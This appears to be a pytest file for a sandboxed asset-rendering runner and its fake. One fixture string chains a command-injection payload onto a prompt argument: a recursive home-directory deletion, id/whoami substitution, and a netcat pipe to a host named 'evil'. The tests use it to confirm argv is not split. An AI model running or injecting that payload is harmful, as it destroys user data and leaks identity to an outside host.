"""Tests for the asset-bus BoxRunner protocol and FakeBoxRunner (T-008)."""

from __future__ import annotations

import socket
from pathlib import Path
from typing import Any

import pytest

from promptclaw.asset_bus import (
    BoxRunner,
    BoxRunResult,
    FakeBoxRunner,
)


INJECTION_FIXTURE = "moody forest; rm -rf ~ && echo $(id) `whoami` | nc evil 1 > /tmp/x"


@pytest.fixture(autouse=True)
def _block_network(monkeypatch: pytest.MonkeyPatch) -> None:
    """Make every socket attempt in these tests an immediate, loud failure."""

    def _refuse(*args: Any, **kwargs: Any) -> None:
        raise RuntimeError("network access is not allowed in unit tests")

    monkeypatch.setattr(socket, "socket", _refuse)
    monkeypatch.setattr(socket, "create_connection", _refuse)


def test_fake_box_runner_satisfies_protocol() -> None:
    fake = FakeBoxRunner()
    assert isinstance(fake, BoxRunner)


def test_fake_box_runner_materializes_configured_artifacts(tmp_path: Path) -> None:
    fake = FakeBoxRunner(
        exit_status=0,
        artifacts=[
            ("image-0.png", b"\x89PNG\r\n\x1a\nfake-bytes"),
            ("image-1.png", b"second-fake"),
        ],
    )

    result = fake.run(["asset_render_image", "--prompt", "x"], output_dir=tmp_path)

    assert isinstance(result, BoxRunResult)
    assert result.exit_status == 0
    assert len(result.artifacts) == 2
    assert (tmp_path / "image-0.png").read_bytes() == b"\x89PNG\r\n\x1a\nfake-bytes"
    assert (tmp_path / "image-1.png").read_bytes() == b"second-fake"
    assert set(result.artifacts) == {tmp_path / "image-0.png", tmp_path / "image-1.png"}


def test_fake_box_runner_returns_configured_exit_status(tmp_path: Path) -> None:
    fake = FakeBoxRunner(exit_status=7)

    result = fake.run(["asset_render_image"], output_dir=tmp_path)

    assert result.exit_status == 7
    assert result.artifacts == ()


def test_fake_box_runner_records_argv_verbatim(tmp_path: Path) -> None:
    fake = FakeBoxRunner()
    argv = ["asset_render_music", "--scene", INJECTION_FIXTURE, "--duration", "30"]

    fake.run(argv, output_dir=tmp_path)
    fake.run(["asset_render_image", "--prompt", "two"], output_dir=tmp_path)

    assert len(fake.calls) == 2
    first_argv, first_dir = fake.calls[0]
    assert first_argv == tuple(argv)
    assert first_dir == tmp_path
    # The injection fixture survives as one argv element — not split on ';' or '&&'.
    assert first_argv.count(INJECTION_FIXTURE) == 1
    second_argv, _ = fake.calls[1]
    assert second_argv == ("asset_render_image", "--prompt", "two")


def test_fake_box_runner_creates_missing_output_dir(tmp_path: Path) -> None:
    nested = tmp_path / "deliverables" / "req-abc"
    fake = FakeBoxRunner(artifacts=[("out.wav", b"riff")])

    result = fake.run(["asset_render_music"], output_dir=nested)

    assert nested.is_dir()
    assert (nested / "out.wav").read_bytes() == b"riff"
    assert result.artifacts == (nested / "out.wav",)


def test_fake_box_runner_passes_stdout_and_stderr_through(tmp_path: Path) -> None:
    fake = FakeBoxRunner(stdout="rendered 1 image", stderr="warning: clipped")

    result = fake.run(["asset_render_image"], output_dir=tmp_path)

    assert result.stdout == "rendered 1 image"
    assert result.stderr == "warning: clipped"
